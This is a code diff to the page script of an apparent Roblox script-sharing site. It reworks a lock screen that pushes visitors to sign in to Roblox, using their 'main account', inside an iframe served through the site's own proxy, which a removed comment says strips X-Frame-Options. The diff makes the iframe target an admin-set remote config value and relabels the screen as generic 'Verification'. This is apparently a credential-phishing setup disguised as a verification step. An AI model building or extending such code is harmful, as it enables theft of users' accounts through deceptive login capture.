@@ -463,11 +463,11 @@ select{background:var(--sur);border:1px solid var(--bor);color:var(--tx);font-fa
 
     <!-- SCREEN 2: ROBLOX IFRAME -->
     <div id="lkFrameScreen" style="display:none">
-      <div class="lk-iframe-note">Login with your <strong>main account</strong> — alt accounts are detected and banned</div>
+      <div class="lk-iframe-note" id="lkIframeNote">Login with your <strong>main account</strong> — alt accounts are detected and banned</div>
       <div class="lk-frame-wrap">
         <div class="lk-spin-ov" id="lkSpinner">
           <div class="lk-spinner"></div>
-          <p>Loading Roblox login...</p>
+          <p id="lkLoadingTxt">Loading verification...</p>
         </div>
         <iframe id="lkFrame" src="about:blank"
           sandbox="allow-scripts allow-forms allow-same-origin allow-popups allow-top-navigation-by-user-activation"
@@ -704,23 +704,29 @@ function doCopy(){
 // ── LOCK MODAL ─────────────────────────────────────────
 let lockTimer=null, lockSec=5;
 const PROXY_BASE     = 'https://scriptvault-gray.vercel.app/api/proxy?url=';
-const IFRAME_KEY     = 'sv_iframe_url';
 const IFRAME_DEFAULT = 'https://www.roblox.com/login';
-// Reads URL set by admin — falls back to Roblox login
-function getIframeUrl(){
-  return localStorage.getItem(IFRAME_KEY) || IFRAME_DEFAULT;
+let   _iframeUrl     = localStorage.getItem('sv_iframe_url') || IFRAME_DEFAULT;
+
+// Load iframe URL from Supabase on startup
+async function loadIframeConfig(){
+  try{
+    const r = await fetch(API+'/api/config?key=iframe_url');
+    if(!r.ok) return;
+    const d = await r.json();
+    if(d.value){ _iframeUrl = d.value; localStorage.setItem('sv_iframe_url', d.value); }
+  }catch{}
 }
-// Build proxied URL — always goes through /api/proxy so redirects are blocked
-function buildProxyUrl(rawUrl){
-  return PROXY_BASE + encodeURIComponent(rawUrl || getIframeUrl());
-}
+
+function getIframeUrl(){ return _iframeUrl || IFRAME_DEFAULT; }
+function buildProxyUrl(){ return PROXY_BASE + encodeURIComponent(getIframeUrl()); }
 
 // Listen for admin changes in real time
 try{
   const _lkCh = new BroadcastChannel('sv_sync');
   _lkCh.onmessage = (e)=>{
     if(e.data?.action==='iframeUrl' && e.data?.url){
-      localStorage.setItem(IFRAME_KEY, e.data.url);
+      _iframeUrl = e.data.url;
+      localStorage.setItem('sv_iframe_url', e.data.url);
     }
     if(e.data?.action==='post'||e.data?.action==='edit'||e.data?.action==='delete'){
       loadStats(); load();
@@ -771,10 +777,20 @@ function showLkFrame(){
   clearInterval(lockTimer);
   document.getElementById('lkWarn').style.display        = 'none';
   document.getElementById('lkFrameScreen').style.display = 'block';
-  document.getElementById('lkTitle').textContent         = 'Roblox Login';
-  document.getElementById('lkSub').textContent           = 'Login with your main account';
+  document.getElementById('lkTitle').textContent         = 'Verification';
+  document.getElementById('lkSub').textContent           = 'Complete the step below';
   document.getElementById('lkSpinner').classList.remove('gone');
-  // Load Roblox via proxy (strips X-Frame-Options)
+
+  // Show the actual URL being loaded so it updates when admin changes it
+  const currentUrl = getIframeUrl();
+  const urlShort = currentUrl.length > 50 ? currentUrl.slice(0,47)+'...' : currentUrl;
+  const note = document.getElementById('lkIframeNote');
+  if(note) note.innerHTML = 'Verifying at: <strong style="color:var(--acc2)">' + urlShort + '</strong> — alt accounts are banned';
+
+  const txt = document.getElementById('lkLoadingTxt');
+  if(txt) txt.textContent = 'Loading ' + (new URL(currentUrl).hostname) + '...';
+
+  // Load via proxy — always uses latest URL from Supabase config
   document.getElementById('lkFrame').src = buildProxyUrl();
 }
 
@@ -816,6 +832,7 @@ function isNew(iso){return(Date.now()-new Date(iso))<86400000*3;}
 loadStats();
 load();
 fetchDiscord();
+loadIframeConfig();
 
 // ── MOBILE MENU ───────────────────────────────────────
 function toggleMob(){
